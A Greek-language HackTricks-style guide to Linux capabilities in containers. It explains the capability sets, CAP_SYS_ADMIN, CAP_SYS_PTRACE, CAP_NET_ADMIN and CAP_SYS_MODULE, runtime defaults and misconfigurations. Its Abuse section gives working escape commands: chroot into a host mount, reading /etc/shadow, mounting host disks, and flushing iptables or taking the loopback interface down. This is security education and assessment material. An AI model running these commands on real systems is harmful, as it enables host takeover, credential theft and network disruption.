# Linux Capabilities Σε Containers

{{#include ../../../../banners/hacktricks-training.md}}

## Επισκόπηση

Οι Linux capabilities είναι ένα από τα σημαντικότερα στοιχεία του container security, επειδή απαντούν σε ένα λεπτό αλλά θεμελιώδες ερώτημα: **τι σημαίνει πραγματικά το "root" μέσα σε ένα container;** Σε ένα κανονικό Linux σύστημα, το UID 0 ιστορικά συνεπαγόταν ένα πολύ ευρύ σύνολο δικαιωμάτων. Στους σύγχρονους kernels, αυτό το δικαίωμα έχει διασπαστεί σε μικρότερες μονάδες που ονομάζονται capabilities. Μια διεργασία μπορεί να εκτελείται ως root και παρ' όλα αυτά να στερείται πολλές ισχυρές λειτουργίες, αν οι σχετικές capabilities έχουν αφαιρεθεί.

Τα containers βασίζονται σε αυτή τη διάκριση σε μεγάλο βαθμό. Πολλά workloads εξακολουθούν να εκκινούν ως UID 0 μέσα στο container για λόγους συμβατότητας ή απλότητας. Χωρίς dropping capabilities, αυτό θα ήταν υπερβολικά επικίνδυνο. Με dropping capabilities, μια διεργασία root μέσα σε container μπορεί να εκτελεί πολλές συνηθισμένες εργασίες εντός του container, ενώ δεν της επιτρέπονται πιο ευαίσθητες λειτουργίες του kernel. Γι' αυτό ένα shell σε container που εμφανίζει `uid=0(root)` δεν σημαίνει αυτόματα "host root" ούτε καν "ευρύ kernel privilege". Τα capability sets καθορίζουν πόση αξία έχει στην πράξη αυτή η ταυτότητα root.

Για την πλήρη αναφορά των Linux capabilities και πολλά παραδείγματα abuse, δείτε:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Λειτουργία

Οι capabilities παρακολουθούνται σε διάφορα sets, όπως τα permitted, effective, inheritable, ambient και bounding sets. Για πολλές αξιολογήσεις containers, τα ακριβή semantics του kernel για κάθε set είναι λιγότερο άμεσα σημαντικά από το τελικό πρακτικό ερώτημα: **ποιες privileged operations μπορεί να εκτελέσει επιτυχώς αυτή η διεργασία αυτή τη στιγμή και ποια μελλοντικά privilege gains εξακολουθούν να είναι δυνατά;**

Ο λόγος που αυτό έχει σημασία είναι ότι πολλές breakout techniques είναι στην πραγματικότητα προβλήματα capabilities που εμφανίζονται ως προβλήματα containers. Ένα workload με `CAP_SYS_ADMIN` μπορεί να αποκτήσει πρόσβαση σε τεράστιο μέρος της λειτουργικότητας του kernel, την οποία ένα κανονικό container root process δεν θα έπρεπε να αγγίζει. Ένα workload με `CAP_NET_ADMIN` γίνεται πολύ πιο επικίνδυνο αν μοιράζεται επίσης το host network namespace. Ένα workload με `CAP_SYS_PTRACE` γίνεται πολύ πιο ενδιαφέρον αν μπορεί να βλέπει host processes μέσω host PID sharing. Στο Docker ή το Podman αυτό μπορεί να εμφανίζεται ως `--pid=host`, ενώ στο Kubernetes συνήθως εμφανίζεται ως `hostPID: true`.

Με άλλα λόγια, το capability set δεν μπορεί να αξιολογηθεί απομονωμένα. Πρέπει να εξετάζεται μαζί με τα namespaces, το seccomp και την πολιτική MAC.

## Lab

Ένας πολύ άμεσος τρόπος για την επιθεώρηση των capabilities μέσα σε ένα container είναι:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Μπορείτε επίσης να συγκρίνετε ένα πιο περιοριστικό container με ένα container στο οποίο έχουν προστεθεί όλες οι capabilities:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Για να δείτε την επίδραση μιας περιορισμένης προσθήκης, δοκιμάστε να αφαιρέσετε τα πάντα και να προσθέσετε ξανά μόνο μία capability:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Αυτά τα μικρά experiments βοηθούν να φανεί ότι ένα runtime δεν αλλάζει απλώς ένα boolean που ονομάζεται "privileged". Διαμορφώνει την πραγματική επιφάνεια δικαιωμάτων που είναι διαθέσιμη στη διεργασία.

## Capabilities Υψηλού Κινδύνου

Παρόλο που πολλά capabilities μπορεί να έχουν σημασία ανάλογα με τον στόχο, μερικά είναι επανειλημμένα σημαντικά στην ανάλυση container escape.

Το **`CAP_SYS_ADMIN`** είναι αυτό που οι defenders πρέπει να αντιμετωπίζουν με τη μεγαλύτερη καχυποψία. Συχνά περιγράφεται ως "το νέο root", επειδή ξεκλειδώνει τεράστιο εύρος λειτουργιών, συμπεριλαμβανομένων λειτουργιών σχετικών με mounts, συμπεριφοράς ευαίσθητης σε namespaces και πολλών kernel paths που δεν θα έπρεπε ποτέ να εκτίθενται απρόσεκτα σε containers. Αν ένα container έχει `CAP_SYS_ADMIN`, weak seccomp και δεν υπάρχει ισχυρός MAC περιορισμός, πολλά κλασικά breakout paths γίνονται πολύ πιο ρεαλιστικά.

Το **`CAP_SYS_PTRACE`** έχει σημασία όταν υπάρχει ορατότητα διεργασιών, ειδικά αν το PID namespace είναι shared με το host ή με ενδιαφέροντα γειτονικά workloads. Μπορεί να μετατρέψει την ορατότητα σε tampering.

Τα **`CAP_NET_ADMIN`** και **`CAP_NET_RAW`** έχουν σημασία σε network-focused περιβάλλοντα. Σε ένα isolated bridge network μπορεί ήδη να είναι επικίνδυνα· σε ένα shared host network namespace είναι πολύ χειρότερα, επειδή το workload μπορεί να είναι σε θέση να αναδιαμορφώσει το host networking, να κάνει sniff, spoof ή να παρεμβαίνει σε local traffic flows.

Το **`CAP_SYS_MODULE`** είναι συνήθως καταστροφικό σε rootful περιβάλλον, επειδή η φόρτωση kernel modules ισοδυναμεί ουσιαστικά με έλεγχο του host kernel. Σχεδόν ποτέ δεν θα έπρεπε να εμφανίζεται σε ένα general-purpose container workload.

## Χρήση από Runtimes

Τα Docker, Podman, stacks που βασίζονται στο containerd και το CRI-O χρησιμοποιούν controls για capabilities, αλλά τα defaults και τα management interfaces διαφέρουν. Το Docker τα εκθέτει πολύ άμεσα μέσω flags όπως τα `--cap-drop` και `--cap-add`. Το Podman προσφέρει παρόμοια controls και συχνά επωφελείται από rootless execution ως πρόσθετο safety layer. Το Kubernetes εκθέτει additions και drops capabilities μέσω του `securityContext` του Pod ή του container. System-container περιβάλλοντα όπως τα LXC/Incus βασίζονται επίσης σε capability control, αλλά η ευρύτερη ενσωμάτωση αυτών των συστημάτων στο host συχνά ωθεί τους operators να χαλαρώνουν τα defaults πιο επιθετικά απ' ό,τι θα έκαναν σε ένα app-container περιβάλλον.

Η ίδια αρχή ισχύει σε όλα: ένα capability που είναι τεχνικά δυνατό να παραχωρηθεί δεν είναι απαραίτητα capability που θα έπρεπε να παραχωρηθεί. Πολλά περιστατικά στον πραγματικό κόσμο ξεκινούν όταν ένας operator προσθέτει ένα capability απλώς επειδή ένα workload απέτυχε υπό αυστηρότερη ρύθμιση και η ομάδα χρειαζόταν μια γρήγορη λύση.

## Misconfigurations

Το πιο προφανές λάθος είναι το **`--cap-add=ALL`** σε CLIs τύπου Docker/Podman, αλλά δεν είναι το μοναδικό. Στην πράξη, πιο συνηθισμένο πρόβλημα είναι η παραχώρηση ενός ή δύο εξαιρετικά ισχυρών capabilities, ειδικά του `CAP_SYS_ADMIN`, για να "λειτουργήσει η εφαρμογή", χωρίς παράλληλη κατανόηση των επιπτώσεων στα namespaces, στο seccomp και στα mounts. Ένα ακόμη συνηθισμένο failure mode είναι ο συνδυασμός επιπλέον capabilities με shared host namespaces. Στα Docker ή Podman αυτό μπορεί να εμφανίζεται ως `--pid=host`, `--network=host` ή `--userns=host`· στο Kubernetes η αντίστοιχη έκθεση συνήθως εμφανίζεται μέσω workload settings όπως `hostPID: true` ή `hostNetwork: true`. Κάθε ένας από αυτούς τους συνδυασμούς αλλάζει το τι μπορεί πραγματικά να επηρεάσει το capability.

Είναι επίσης συνηθισμένο οι administrators να πιστεύουν ότι, επειδή ένα workload δεν είναι πλήρως `--privileged`, εξακολουθεί να έχει ουσιαστικούς περιορισμούς. Μερικές φορές αυτό ισχύει, αλλά μερικές φορές το effective posture είναι ήδη αρκετά κοντά στο privileged, ώστε η διάκριση να παύει να έχει operational σημασία.

## Abuse

Το πρώτο πρακτικό βήμα είναι η απαρίθμηση του effective capability set και ο άμεσος έλεγχος των capability-specific actions που θα είχαν σημασία για escape ή πρόσβαση σε host information:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
Εάν υπάρχει το `CAP_SYS_ADMIN`, ελέγξτε πρώτα την κατάχρηση μέσω mount και την πρόσβαση στο filesystem του host, επειδή αυτός είναι ένας από τους πιο συνηθισμένους παράγοντες που επιτρέπουν breakout:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Εάν υπάρχει το `CAP_SYS_PTRACE` και το container μπορεί να δει ενδιαφέρουσες διεργασίες, επαλήθευσε εάν η capability μπορεί να αξιοποιηθεί για process inspection:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Εάν υπάρχει το `CAP_NET_ADMIN` ή το `CAP_NET_RAW`, ελέγξτε εάν το workload μπορεί να χειριστεί την ορατή στοίβα δικτύου ή τουλάχιστον να συλλέξει χρήσιμες πληροφορίες δικτύου:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Όταν ένα capability test πετυχαίνει, συνδύασέ το με την κατάσταση των namespaces. Ένα capability που φαίνεται απλώς επικίνδυνο σε ένα isolated namespace μπορεί να γίνει αμέσως escape ή host-recon primitive όταν το container μοιράζεται επίσης το host PID, το host network ή τα host mounts.

### Πλήρες Παράδειγμα: `CAP_SYS_ADMIN` + Host Mount = Host Escape

Αν το container διαθέτει `CAP_SYS_ADMIN` και ένα writable bind mount του filesystem του host, όπως το `/host`, η διαδρομή διαφυγής είναι συχνά απλή:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
Εάν το `chroot` ολοκληρωθεί με επιτυχία, οι εντολές εκτελούνται πλέον στο context του root filesystem του host:
```bash
id
hostname
cat /etc/shadow | head
```
Αν το `chroot` δεν είναι διαθέσιμο, το ίδιο αποτέλεσμα μπορεί συχνά να επιτευχθεί καλώντας το binary μέσω του mounted tree:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Πλήρες παράδειγμα: `CAP_SYS_ADMIN` + Πρόσβαση σε συσκευές

Εάν εκτεθεί μια block device από το host, το `CAP_SYS_ADMIN` μπορεί να τη μετατρέψει σε άμεση πρόσβαση στο filesystem του host:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Πλήρες Παράδειγμα: `CAP_NET_ADMIN` + Host Networking

Αυτός ο συνδυασμός δεν παρέχει πάντα απευθείας host root, αλλά μπορεί να αναδιαμορφώσει πλήρως το network stack του host:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Αυτό μπορεί να επιτρέψει denial of service, traffic interception ή πρόσβαση σε υπηρεσίες που προηγουμένως φιλτράρονταν.

## Έλεγχοι

Ο στόχος των capability checks δεν είναι μόνο η αποτύπωση ακατέργαστων τιμών, αλλά και η κατανόηση του αν η διεργασία διαθέτει αρκετά προνόμια ώστε η τρέχουσα κατάσταση του namespace και του mount να είναι επικίνδυνη.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Τι είναι ενδιαφέρον εδώ:

- Το `capsh --print` είναι ο ευκολότερος τρόπος για να εντοπίσετε capabilities υψηλού κινδύνου, όπως `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` ή `cap_sys_module`.
- Η γραμμή `CapEff` στο `/proc/self/status` σάς δείχνει τι είναι πραγματικά effective τώρα, όχι απλώς τι μπορεί να είναι διαθέσιμο σε άλλα sets.
- Ένα capability dump αποκτά πολύ μεγαλύτερη σημασία αν το container μοιράζεται επίσης τα host PID, network ή user namespaces ή διαθέτει writable host mounts.

Μετά τη συλλογή των raw πληροφοριών για τα capabilities, το επόμενο βήμα είναι η ερμηνεία τους. Εξετάστε αν η process είναι root, αν είναι ενεργά τα user namespaces, αν μοιράζονται host namespaces, αν το seccomp εφαρμόζεται και αν το AppArmor ή το SELinux εξακολουθούν να περιορίζουν την process. Ένα capability set από μόνο του αποτελεί μόνο μέρος της εικόνας, αλλά συχνά είναι το μέρος που εξηγεί γιατί ένα container breakout λειτουργεί ενώ ένα άλλο αποτυγχάνει με το ίδιο φαινομενικό starting point.

## Προεπιλογές Runtime

| Runtime / platform | Προεπιλεγμένη κατάσταση | Προεπιλεγμένη συμπεριφορά | Συνήθης χειροκίνητη αποδυνάμωση |
| --- | --- | --- | --- |
| Docker Engine | Μειωμένο capability set από προεπιλογή | Το Docker διατηρεί ένα προεπιλεγμένο allowlist capabilities και απορρίπτει τα υπόλοιπα | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Μειωμένο capability set από προεπιλογή | Τα Podman containers είναι unprivileged από προεπιλογή και χρησιμοποιούν ένα μειωμένο capability model | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Κληρονομεί τις προεπιλογές του runtime, εκτός αν αλλάξουν | Αν δεν καθοριστούν `securityContext.capabilities`, το container λαμβάνει το προεπιλεγμένο capability set από το runtime | `securityContext.capabilities.add`, παράλειψη του `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Συνήθως η προεπιλογή του runtime | Το effective set εξαρτάται από το runtime και το Pod spec | όπως στη γραμμή Kubernetes· η άμεση OCI/CRI configuration μπορεί επίσης να προσθέσει capabilities ρητά |

Για το Kubernetes, το σημαντικό σημείο είναι ότι το API δεν καθορίζει ένα ενιαίο universal default capability set. Αν το Pod δεν προσθέτει ή δεν αφαιρεί capabilities, το workload κληρονομεί την προεπιλογή του runtime για τον συγκεκριμένο node.

{{#include ../../../../banners/hacktricks-training.md}}
